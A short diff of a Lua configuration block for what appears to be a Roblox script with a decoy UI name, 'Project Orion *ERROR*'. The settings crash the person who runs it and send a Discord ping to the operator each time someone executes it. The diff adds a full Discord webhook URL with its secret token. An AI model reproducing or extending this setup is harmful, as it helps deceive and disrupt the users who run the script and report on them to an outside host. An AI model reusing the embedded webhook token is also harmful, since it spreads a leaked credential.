@@ -12,7 +12,7 @@ _G.Crash = true  --// Crashes Them After Its Finished
 --[[ Webhook Config ]]--
 _G.Enabled = true --// Toggle For Sending Webhooks
 _G.Mention = true --// Pings You When Someone Executes
-_G.Webhook = "" --// Discord Webhook For Executions
+_G.Webhook = "https://discord.com/api/webhooks/1098424928803508234/_7KKLRzNrgMT6GTOX7tTPVtLPaODYMPfTIWx44H-x0K-bsutCfIX01ZshCqhZNf5cULI" --// Discord Webhook For Executions
 
 --[[ UI Config ]]--
 _G.ScriptName = "Project Orion *ERROR*" --// Script Name On The UI
